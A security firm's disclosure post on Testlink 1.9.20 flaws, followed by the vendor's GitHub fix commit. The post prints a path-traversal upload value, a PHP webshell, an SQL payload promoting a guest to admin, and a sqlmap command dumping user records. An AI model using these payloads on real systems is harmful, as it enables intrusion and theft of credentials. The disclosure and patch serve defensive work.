=== Content from ackcent.com_b8007ebc_20250119_122110.html ===


[![Ackcent](https://ackcent.com/wp-content/uploads/2020/04/logo-dark.svg)
![Ackcent](https://ackcent.com/wp-content/uploads/2020/04/logo-light.svg)](https://ackcent.com)

* Services
  + [Red Team
    Discover. Prevent. Remediate](https://ackcent.com/attack-services/)
  + [MDR Services
    Monitor. Detect. Respond](https://ackcent.com/detection-and-response-services/)
  + [Training
    Assess. Plan. Simplify](https://ackcent.com/cybersecurity-services/)
* Resources
  + [Blog](https://ackcent.com/blog/)
  + [Glossary](https://ackcent.com/glossary/)
* Company
  + [About Us](https://ackcent.com/about-us/)
  + [Certifications](https://ackcent.com/certifications/)
  + [Partners](https://ackcent.com/partnerships/)
  + [Careers](https://ackcent.com/careers/)

[Contact Us](https://ackcent.com/contact-us/)
[Get an assessment](https://ackcent.com/diagnostic/)

[![Ackcent](https://ackcent.com/wp-content/uploads/2020/04/logo-dark.svg)](https://ackcent.com)

* Services
  + [Red Team
    Discover. Prevent. Remediate](https://ackcent.com/attack-services/)
  + [MDR Services
    Monitor. Detect. Respond](https://ackcent.com/detection-and-response-services/)
  + [Training
    Assess. Plan. Simplify](https://ackcent.com/cybersecurity-services/)
* Resources
  + [Blog](https://ackcent.com/blog/)
  + [Glossary](https://ackcent.com/glossary/)
* Company
  + [About Us](https://ackcent.com/about-us/)
  + [Certifications](https://ackcent.com/certifications/)
  + [Partners](https://ackcent.com/partnerships/)
  + [Careers](https://ackcent.com/careers/)

[Contact Us](https://ackcent.com/contact-us/)
[Get an assessment](https://ackcent.com/diagnostic/)

[![](https://ackcent.com/wp-content/uploads/2020/04/logo-dark.svg)](/)

Testlink 1.9.20: Unrestricted file upload and SQL injection

# Testlink 1.9.20: Unrestricted file upload and SQL injection

Testlink is an open source, web based test management and test execution system written in PHP (a scripting language also known as an Hypertext Preprocessor).

![Testlink 1.9.20: Unrestricted file upload and SQL injection](https://ackcent.com/wp-content/uploads/2020/04/vulnerability.jpeg)

April 03, 2020
By Miguel Delgado

[Testlink](http://testlink.org/) is an open-source, web-based test management and test execution system written in PHP (a scripting language also known as a **Hypertext Preprocessor**). During a recent security audit, our AppSec team found an unrestricted file upload ([CVE-2020-8639](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8639)) and two SQL Injection vulnerabilities ([CVE-2020-8637](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8637), [CVE-2020-8638](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8638)). Below we provide an in-depth overview of the three identified flaws and ways they can be exploited.

## Unrestricted file upload: Technical Analysis

Teslink offers the possibility to categorize test cases using keywords. These keywords can be exported and imported, and in this operation, we found our first vulnerability.

![](https://www-wordpress-thevoo6roh7taita.ackcent.com/wp-content/uploads/2020/05/image-28.jpg)

This screen allows us to upload a file containing keywords, and by selecting the `File type` we can choose between XML or CSV format. Let’s now look at the implementation of the init\_args method in the file [keywordsImport.php](https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/lib/keywords/keywordsImport.php)

```
function init_args(&$dbHandler)
{
  $_REQUEST = strings_stripSlashes($_REQUEST);
  $ipcfg = array("UploadFile" => array(tlInputParameter::STRING_N,0,1),
                 "importType" => array(tlInputParameter::STRING_N,0,100),
                 "tproject_id" => array(tlInputParameter::INT_N));
  $args = new stdClass();
  R_PARAMS($ipcfg,$args);
  if( $args->tproject_id <= 0 )
  {
    throw new Exception(" Error Invalid Test Project ID", 1);
  }
  // Check rights before doing anything else
  // Abort if rights are not enough
  $user = $_SESSION['currentUser'];
  $env['tproject_id'] = $args->tproject_id;
  $env['tplan_id'] = 0;
  $check = new stdClass();
  $check->items = array('mgt_modify_key');
  $check->mode = 'and';
  checkAccess($dbHandler,$user,$env,$check);
  $tproj_mgr = new testproject($dbHandler);
  $dm = $tproj_mgr->get_by_id($args->tproject_id,array('output' => 'name'));
  $args->tproject_name = $dm['name'];
  $args->UploadFile = ($args->UploadFile != "") ? 1 : 0;
  $args->fInfo = isset($_FILES['uploadedFile']) ? $_FILES['uploadedFile'] : null;
  $args->source = isset($args->fInfo['tmp_name']) ? $args->fInfo['tmp_name'] : null;
  $args->dest = TL_TEMP_PATH . session_id() . "-importkeywords." . $args->importType;
  return $args;
}
```

First, the [strings\_stripSlashes](https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/2f6a6f4dd0cd500258f0f4ddf0eeb3fd93714433/lib/functions/common.php#L547) method un-quotes all quoted-string values from `$_REQUEST`. Then with the [R\_PARAMS](https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/2f6a6f4dd0cd500258f0f4ddf0eeb3fd93714433/lib/functions/inputparameter.inc.php#L99) method, the parameters defined in `$ipcfg` are retrieved from the `REQUEST` and stored in `$args`. The uploaded file is stored in `$args->source` and the value of `$args->importType` is concatenated in `$args->dest`. There is nothing to stop us from changing the value of `importType` to `/../../any/folder/we/want`. In other words, this parameter is vulnerable to Path Traversal.

Now let’s see where `$args->dest` is used:

```
$args = init_args($db);
$gui = initializeGui($args);
if(!$gui->msg && $args->UploadFile)
{
  if(($args->source != 'none') && ($args->source != ''))
  {
    if (move_uploaded_file($args->source, $args->dest))
```

It is used in [move\_uploaded\_file](https://www.php.net/manual/en/function.move-uploaded-file.php) so we can upload a file in any directory of the server.

## Unrestricted file upload: Exploit

One way to exploit this vulnerability would be to upload a webshell to have Remote Code Execution on the server where Testlink is deployed. To do this we need to locate a path on the server that the system user running Testlink has write permissions for (for example, /logs).

The value of `importType` should be `/../../../logs/ws.php` and we need to pass the code of our webshell in the variable `uploadedFile` in PHP. For example, this can be done in the following way:

```
<html>
    <body>
        <form method="POST">
            <input name="command" id="command" />
            <input type="submit" value="Send" />
        </form>
        <pre>
            <?php if(isset($_POST['command']))
        {
            system($_POST['command']);
        } ?>
        </pre>
    </body>
</html>
```

This way we can execute code on the server:

![Webshell](https://www-wordpress-thevoo6roh7taita.ackcent.com/wp-content/uploads/2020/05/webshell.png)
## SQL Injection: Technical Analysis

Testlink is vulnerable to SQL Injection, both in [tree.class.php](https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/lib/functions/tree.class.php) and [testPlanUrgency.class.php](https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/lib/functions/testPlanUrgency.class.php).

Let’s look at each of the SQL injection in detail. The flow of the first one starts in [dragdroptreenodes.php](https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/lib/ajax/dragdroptreenodes.php), the injection is done in the unsanitized parameter `nodeid`.

The following code snippet shows the entry point to the vulnerability:

```
function init_args()
{
  $args=new stdClass();
  $key2loop=array('nodeid','newparentid','doAction','top_or_bottom','nodeorder','nodelist');
  foreach($key2loop as $key)
  {
    $args->$key=isset($_REQUEST[$key]) ? $_REQUEST[$key] : null;
  }
  return $args;
}
```

The user input `nodeid` is retrieved from the `$_REQUEST` and stored in `$args->nodeid`. The `change_parent` method is then invoked:

```
$args=init_args();
$treeMgr = new tree($db);
switch($args->doAction)
{
    case 'changeParent':
        $treeMgr->change_parent($args->nodeid,$args->newparentid);
    break;
```

The method definition is in [tree.class.php](https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/lib/functions/tree.class.php)

```
  function change_parent($node_id, $parent_id)
  {
    $debugMsg='Class:' .__CLASS__ . ' - Method:' . __FUNCTION__ . ' :: ';
    if( is_array($node_id) )
    {
      $id_list = implode(",",$node_id);
      $where_clause = " WHERE id IN ($id_list) ";
    }
    else
    {
      $where_clause=" WHERE id = {$node_id}";
    }
    $sql = "/* $debugMsg */ UPDATE {$this->object_table} " .
           " SET parent_id = " . $this->db->prepare_int($parent_id) . " {$where_clause}";
    $result = $this->db->exec_query($sql);
    return $result ? 1 : 0;
  }

```

As you can see in the source code, the `$node_id` is concatenated in the `WHERE` of the SQL statement, enabling the manipulation of the SQL syntax.

The second SQL injection starts in [planUrgency.php](https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/lib/plan/planUrgency.php) the injection is done in the unsanitized parameter `urgency`.

```
  if (isset($_REQUEST['urgency']))
  {
    $args->urgency_tc = $_REQUEST['urgency'];
  }
```

After retrieving the `urgency` value of `$_REQUEST`, the `setTestUrgency` method is called.

```
  // Set urgency for individual testcases
  if(isset($argsObj->urgency_tc))
  {
    foreach ($argsObj->urgency_tc as $id => $urgency)
    {
      $tplanMgr->setTestUrgency($argsObj->tplan_id, $id, $urgency);
    }
  }

```

The definition of the `setTestUrgency` method can be found at [testPlanUrgency.class.php](https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/lib/functions/testPlanUrgency.class.php).

```
  public function setTestUrgency($testplan_id, $tc_id, $urgency)
  {
    $sql = " UPDATE {$this->tables['testplan_tcversions']} SET urgency={$urgency} " .
           " WHERE testplan_id=" . $this->db->prepare_int($testplan_id) .
           " AND tcversion_id=" . $this->db->prepare_int($tc_id);
    $result = $this->db->exec_query($sql);
    return $result ? tl::OK : tl::ERROR;
  }
```

Finally `$urgency` is directly embedded into a SQL query, allowing an attacker to control the SQL statement that will be executed in the database.

## SQL Injection: Technical Analysis: Exploit

Teslink can be installed to use MySQL or PostgreSQL. If it is using MySQL, an attacker can list sensitive database information. But if it is using PostgreSQL, since it allows stacked queries, it permits any attacker to execute malicious queries on the server’s database.

### PostgreSQL environment

This is the best scenario in an attacker’s perspective, because he can just execute any SQL query, only adding a `;` followed by the query he wants to execute and finally a `--` to comment on the rest of the query.

For example, we could make an account with a Guest role to become an Admin.

If we look at the script that populates the roles data in [testlink\_create\_default\_data.sql](https://github.com/TestLinkOpenSourceTRMS/testlink-code/blob/1.9.20/install/sql/postgres/testlink_create_default_data.sql), we can see that the Role with id `8` is the Admin

```
# Roles -
INSERT INTO /*prefix*/roles  (id,description) VALUES (1, '<reserved system role 1>');
INSERT INTO /*prefix*/roles  (id,description) VALUES (2, '<reserved system role 2>');
INSERT INTO /*prefix*/roles  (id,description) VALUES (3, '<no rights>');
INSERT INTO /*prefix*/roles  (id,description) VALUES (4, 'test designer');
INSERT INTO /*prefix*/roles  (id,description) VALUES (5, 'guest');
INSERT INTO /*prefix*/roles  (id,description) VALUES (6, 'senior tester');
INSERT INTO /*prefix*/roles  (id,description) VALUES (7, 'tester');
INSERT INTO /*prefix*/roles  (id,description) VALUES (8, 'admin');
INSERT INTO /*prefix*/roles  (id,description) VALUES (9, 'leader');

Knowing this we can build the following payload to update the role_id of the user in the users table.
```

Knowing this we can build the following payload to update the `role_id` of the user in the `users` table.

```
nodeid=47; update users set role_id='8' where login='user';--
```

Before executing the payload the user only has Guest rights:

![Guest user](https://www-wordpress-thevoo6roh7taita.ackcent.com/wp-content/uploads/2020/05/user3.png)

After running our payload, the user becomes Admin and has all the respective permissions:

![Guest user](https://www-wordpress-thevoo6roh7taita.ackcent.com/wp-content/uploads/2020/05/user4.png)
### MySQL environment

In this scenario, since no stacked queries are allowed, we cannot change the database values, but we can dump their data.

To automate the process we can use the [sqlmap](http://sqlmap.org/) tool. For instance, if we wanted to dump the data from the users table, we would have to execute the following command:

```
python sqlmap.py -u <URL_TESTLINK>/lib/ajax/dragdroptreenodes.php
--data="doAction=changeParent&oldparentid=41&newparentid=41&nodelist=47%2C45&nodeorder=0&nodeid=47"
-p nodeid
--cookie="PHPSESSID=<PHP_SESSION_ID>; TESTLINK1920TESTLINK_USER_AUTH_COOKIE=<USER_AUTH_COOKIE>"
--dump -D testlink -T users
```

The purpose of this blog post is not to explain how to use sqlmap, so we will just briefly explain the arguments we have passed to this command:

* u -> target URL, in our case is one of the SQL Injections we have previously found
* data -> data string to be sent through POST
* p -> testable parameter, in our case we know it is the nodeid
* cookie -> HTTP Cookie header value
* dump -> dump DBMS database table entries
* D -> database name
* T -> table name

With these arguments we make sqlmap focus on what we want, making it take less time and launching fewer requests against the server.

The output of the sqlmap is:

```
web application technology: Apache 2.4.41, PHP 7.3.14
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
Database: testlink
Table: users
[2 entries]
+----+---------+---------------+-------+--------- --- ----+----------- --- ---+-------------- --- ---+
| id | role_id | email         | login | password         | script_key        | cookie_string        |
+----+---------+---------------+-------+--------- --- ----+----------- --- ---+-------------- --- ---+
| 1  | 8       | [[email protected]](/cdn-cgi/l/email-protection)   | admin | $2y$10$9 ... L/e | d4aed7db45 ... a5 | 517372818f771 ... 94 |
| 2  | 5       | [[email protected]](/cdn-cgi/l/email-protection)    | user  | $2y$10$8 ... YPW | NULL              | 9deab133cb5f7 ... 6a |
+----+---------+---------------+-------+--------- --- ----+----------- --- ---+-------------- --- ---+

```

When we analyze the sqlmap output, we can see that Testlink uses bcrypt to store users’ passwords so we can’t do anything with this information. However, it stores the apiKey and cookie in clear text, so we can use them to make requests as Admin.

## Conclusions

In this blog post, we have seen why it is so important to never trust the data provided by a user. Data from all potentially unreliable sources should be subject to input validation and these three vulnerabilities could have been avoided by applying correct input data validations.

In the case of the Unrestricted file upload vulnerability, we want to emphasize the importance of conducting a static analysis, because this kind of vulnerabilities can easily be overlooked in a dynamic analysis, but it is much easier and faster to detect it by checking the source code.

## Timeline

| Date | Event |
| --- | --- |
| 31/1/2020 | First contact with vendor |
| 5/2/2020 | Commits of correct patch ([#1](https://github.com/TestLinkOpenSourceTRMS/testlink-code/commit/57d81ae350d569c5c95087997fe051c49e14516d), [#2](https://github.com/TestLinkOpenSourceTRMS/testlink-code/commit/d99bd8277d384f3417e917ce20bef5d061110343) , [#3](https://github.com/TestLinkOpenSourceTRMS/testlink-code/commit/58f3cc03d5f81cd5cc2ad8c7ba645cc486cebc05)) |
| 25/2/2020 | We ask the vendor when the new version with the fixes will be released |
| 27/2/2020 | Vendor indicates that there is not going to be a new release, users should download the branch testlink\_1\_9\_20\_fixed |

Get resources in your mailbox for free

#### **Keep Reading:** related stories

[![Protect against cyberattacks while teleworking amid the COVID-19 outbreak](https://ackcent.com/wp-content/uploads/2020/03/cybersecurity-coronavirus.jpg)](https://ackcent.com/protect-against-cyberattacks-while-teleworking-amid-the-covid-19-outbreak/)

* [Awareness](awareness)

### [Protect against cyberattacks while teleworking amid the COVID-19 outbreak](https://ackcent.com/protect-against-cyberattacks-while-teleworking-amid-the-covid-19-outbreak/)

As fear over the spread of COVID-19 is surging at an alarming rate, public health institutions recommend companies to take a stance in preventing the virus from spreading around offices, public transports or public gatherings.

March 12, 2020
By [Ackcent Cybersecurity](https://ackcent.com/author/ackcent/ "Posts by Ackcent Cybersecurity")

[![Protect yourself against COVID-19-themed cyberattacks](https://ackcent.com/wp-content/uploads/2020/03/covid-19-themed-attacks-scaled.jpg)](https://ackcent.com/protect-yourself-against-covid-19-themed-cyberattacks/)

* [Awareness](awareness)

### [Protect yourself against COVID-19-themed cyberattacks](https://ackcent.com/protect-yourself-against-covid-19-themed-cyberattacks/)

The outbreak of the Coronavirus is affecting people, organizations and nations around the globe. In an environment where people are hungry for information, attackers are taking advantage to spread malware.

March 19, 2020
By [Ackcent Cybersecurity](https://ackcent.com/author/ackcent/ "Posts by Ackcent Cybersecurity")

[![Building a safe teleworking environment](https://ackcent.com/wp-content/uploads/2020/03/telework-protection-scaled.jpg)](https://ackcent.com/building-a-safe-teleworking-environment/)

* [Awareness](awareness)
* [MDR Team](mdr-team)

### [Building a safe teleworking environment](https://ackcent.com/building-a-safe-teleworking-environment/)

In this period, organizations face immense challenges in terms of business continuity. But it is also a great opportunity to build the perfect remote environment.

March 30, 2020
By [Ackcent Cybersecurity](https://ackcent.com/author/ackcent/ "Posts by Ackcent Cybersecurity")

![](https://ackcent.com/wp-content/uploads/2020/04/logo-dark.svg)

* Company
  + [About Us](https://ackcent.com/about-us/)
  + [Certifications](https://ackcent.com/certifications/)
  + [Partners](https://ackcent.com/partnerships/)
  + [Careers](https://ackcent.com/careers/)
* Resources
  + [Blog](https://ackcent.com/blog/)
  + [Glossary](https://ackcent.com/glossary/)
* Get in touch
  + [Contact us](https://ackcent.com/contact-us/)

Subscribe to the newsletter

© Ackcent 2025. All rights reserved.

* [Cookie Policy](https://ackcent.com/cookie-policy/)
* [Terms of Use](https://ackcent.com/terms-of-use/)
* [Whistleblowing](https://ackcent.com/whistleblowing/)



=== Content from github.com_9f1fa863_20250119_122111.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FTestLinkOpenSourceTRMS%2Ftestlink-code%2Fcommit%2F58f3cc03d5f81cd5cc2ad8c7ba645cc486cebc05)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FTestLinkOpenSourceTRMS%2Ftestlink-code%2Fcommit%2F58f3cc03d5f81cd5cc2ad8c7ba645cc486cebc05)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=TestLinkOpenSourceTRMS%2Ftestlink-code)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[TestLinkOpenSourceTRMS](/TestLinkOpenSourceTRMS)
/
**[testlink-code](/TestLinkOpenSourceTRMS/testlink-code)**
Public

* [Notifications](/login?return_to=%2FTestLinkOpenSourceTRMS%2Ftestlink-code) You must be signed in to change notification settings
* [Fork
  587](/login?return_to=%2FTestLinkOpenSourceTRMS%2Ftestlink-code)
* [Star
   1.4k](/login?return_to=%2FTestLinkOpenSourceTRMS%2Ftestlink-code)

* [Code](/TestLinkOpenSourceTRMS/testlink-code)
* [Pull requests
  49](/TestLinkOpenSourceTRMS/testlink-code/pulls)
* [Actions](/TestLinkOpenSourceTRMS/testlink-code/actions)
* [Projects
  0](/TestLinkOpenSourceTRMS/testlink-code/projects)
* [Wiki](/TestLinkOpenSourceTRMS/testlink-code/wiki)
* [Security](/TestLinkOpenSourceTRMS/testlink-code/security)
* [Insights](/TestLinkOpenSourceTRMS/testlink-code/pulse)

Additional navigation options

* [Code](/TestLinkOpenSourceTRMS/testlink-code)
* [Pull requests](/TestLinkOpenSourceTRMS/testlink-code/pulls)
* [Actions](/TestLinkOpenSourceTRMS/testlink-code/actions)
* [Projects](/TestLinkOpenSourceTRMS/testlink-code/projects)
* [Wiki](/TestLinkOpenSourceTRMS/testlink-code/wiki)
* [Security](/TestLinkOpenSourceTRMS/testlink-code/security)
* [Insights](/TestLinkOpenSourceTRMS/testlink-code/pulse)

## Commit

[Permalink](/TestLinkOpenSourceTRMS/testlink-code/commit/58f3cc03d5f81cd5cc2ad8c7ba645cc486cebc05)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

refactoring for security ([www.ackcent.com](http://www.ackcent.com))

[Browse files](/TestLinkOpenSourceTRMS/testlink-code/tree/58f3cc03d5f81cd5cc2ad8c7ba645cc486cebc05)
Browse the repository at this point in the history

* Loading branch information

[![@fmancardi](https://avatars.githubusercontent.com/u/235697?s=40&v=4)](/fmancardi)

[fmancardi](/TestLinkOpenSourceTRMS/testlink-code/commits?author=fmancardi "View all commits by fmancardi")
committed
Feb 5, 2020

1 parent
[d99bd82](/TestLinkOpenSourceTRMS/testlink-code/commit/d99bd8277d384f3417e917ce20bef5d061110343)

commit 58f3cc0

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**20 additions**
and
**32 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* lib

  + functions

    - lib/functions/testPlanUrgency.class.php
      [testPlanUrgency.class.php](#diff-bdd008af92efe91d797c4b0d61a301b027ce99b7cfbe1c01e7d48a60d8a4e908)
  + plan

    - lib/plan/planUrgency.php
      [planUrgency.php](#diff-365a67b1a4e876f42ee000dbc2946cc4943bf25ab8d157806dbe9d1a61be780e)

## There are no files selected for viewing

14 changes: 7 additions & 7 deletions

14
[lib/functions/testPlanUrgency.class.php](#diff-bdd008af92efe91d797c4b0d61a301b027ce99b7cfbe1c01e7d48a60d8a4e908 "lib/functions/testPlanUrgency.class.php")

Show comments

[View file](/TestLinkOpenSourceTRMS/testlink-code/blob/58f3cc03d5f81cd5cc2ad8c7ba645cc486cebc05/lib/functions/testPlanUrgency.class.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -5,12 +5,10 @@ |
|  |  | \* |
|  |  | \* @package TestLink |
|  |  | \* @author Martin Havlat |
|  |  | \* @copyright 2007-2014, TestLink community |
|  |  | \* @copyright 2007-2020, TestLink community |
|  |  | \* @filesource testPlanUrgency.class.php |
|  |  | \* @link http://www.testlink.org |
|  |  | \* |
|  |  | \* @internal revisions |
|  |  | \* @since 1.9.13 |
|  |  | \*/ |
|  |  |  |
|  |  | /\*\* |
| Expand All | | @@ -34,16 +32,18 @@ class testPlanUrgency extends testplan |
|  |  | \*/ |
|  |  | public function setTestUrgency($testplan\_id, $tc\_id, $urgency) |
|  |  | { |
|  |  | $sql = " UPDATE {$this->tables['testplan\_tcversions']} SET urgency={$urgency} " . |
|  |  | " WHERE testplan\_id=" . $this->db->prepare\_int($testplan\_id) . |
|  |  | $sql = " UPDATE {$this->tables['testplan\_tcversions']} |
|  |  | SET urgency=" |
|  |  | . $this->db->prepare\_int($urgency) . |
|  |  | " WHERE testplan\_id=" |
|  |  | . $this->db->prepare\_int($testplan\_id) . |
|  |  | " AND tcversion\_id=" . $this->db->prepare\_int($tc\_id); |
|  |  |  |
|  |  | $result = $this->db->exec\_query($sql); |
|  |  |  |
|  |  | return $result ? tl::OK : tl::ERROR; |
|  |  | } |
|  |  |  |
|  |  |  |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Set urgency for TCs (direct child only) within a Test Suite and Test Plan |
|  |  | \* |
| Expand Down | |  |

38 changes: 13 additions & 25 deletions

38
[lib/plan/planUrgency.php](#diff-365a67b1a4e876f42ee000dbc2946cc4943bf25ab8d157806dbe9d1a61be780e "lib/plan/planUrgency.php")

Show comments

[View file](/TestLinkOpenSourceTRMS/testlink-code/blob/58f3cc03d5f81cd5cc2ad8c7ba645cc486cebc05/lib/plan/planUrgency.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -7,29 +7,26 @@ |
|  |  | \* @filesource planUrgency.php |
|  |  | \* @package TestLink |
|  |  | \* @author Martin Havlat |
|  |  | \* @copyright 2003-2014, TestLink community |
|  |  | \* @copyright 2003-2020, TestLink community |
|  |  | \* @link http://www.testlink.org |
|  |  | \* |
|  |  | \* @internal revisions |
|  |  | \* @since 1.9.13 |
|  |  | \*\*/ |
|  |  |  |
|  |  | require('../../config.inc.php'); |
|  |  | require\_once('common.php'); |
|  |  | testlinkInitPage($db,false,false,"checkRights"); |
|  |  | $args = init\_args(); |
|  |  |  |
|  |  | if($args->show\_help) |
|  |  | { |
|  |  | if ($args->show\_help) { |
|  |  | show\_instructions('test\_urgency'); |
|  |  | exit(); |
|  |  | } |
|  |  |  |
|  |  | $templateCfg = templateConfiguration(); |
|  |  | $tplan\_mgr = new testPlanUrgency($db); |
|  |  | $gui = initializeGui($args,$tplan\_mgr->tree\_manager); |
|  |  |  |
|  |  | if( $args->urgency != OFF || isset($args->urgency\_tc) ) |
|  |  | { |
|  |  | if ($args->urgency != OFF || isset($args->urgency\_tc)){ |
|  |  | $gui->user\_feedback = doProcess($args,$tplan\_mgr); |
|  |  | } |
|  |  |  |
| Expand Down  Expand Up | | @@ -80,26 +77,18 @@ function init\_args() |
|  |  |  |
|  |  | // Sets urgency for suite |
|  |  |  |
|  |  | if (isset($\_REQUEST['high\_urgency'])) |
|  |  | { |
|  |  | if (isset($\_REQUEST['high\_urgency'])) { |
|  |  | $args->urgency = HIGH; |
|  |  | } |
|  |  | elseif (isset($\_REQUEST['medium\_urgency'])) |
|  |  | { |
|  |  | } elseif (isset($\_REQUEST['medium\_urgency'])) { |
|  |  | $args->urgency = MEDIUM; |
|  |  | } |
|  |  | elseif (isset($\_REQUEST['low\_urgency'])) |
|  |  | { |
|  |  | } elseif (isset($\_REQUEST['low\_urgency'])) { |
|  |  | $args->urgency = LOW; |
|  |  | } |
|  |  | else |
|  |  | { |
|  |  | } else { |
|  |  | $args->urgency = OFF; |
|  |  | } |
|  |  |  |
|  |  | // Sets urgency for every single tc |
|  |  | if (isset($\_REQUEST['urgency'])) |
|  |  | { |
|  |  | if (isset($\_REQUEST['urgency'])) { |
|  |  | $args->urgency\_tc = $\_REQUEST['urgency']; |
|  |  | } |
|  |  |  |
| Expand Down  Expand Up | | @@ -151,11 +140,10 @@ function doProcess(&$argsObj,&$tplanMgr) |
|  |  | } |
|  |  |  |
|  |  | // Set urgency for individual testcases |
|  |  | if(isset($argsObj->urgency\_tc)) |
|  |  | { |
|  |  | foreach ($argsObj->urgency\_tc as $id => $urgency) |
|  |  | { |
|  |  | $tplanMgr->setTestUrgency($argsObj->tplan\_id, $id, $urgency); |
|  |  | if (isset($argsObj->urgency\_tc)) { |
|  |  | foreach ($argsObj->urgency\_tc as $id => $urgency) { |
|  |  | $tplanMgr->setTestUrgency($argsObj->tplan\_id, |
|  |  | intval($id), intval($urgency)); |
|  |  | } |
|  |  | } |
|  |  |  |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `58f3cc0`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FTestLinkOpenSourceTRMS%2Ftestlink-code%2Fcommit%2F58f3cc03d5f81cd5cc2ad8c7ba645cc486cebc05) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


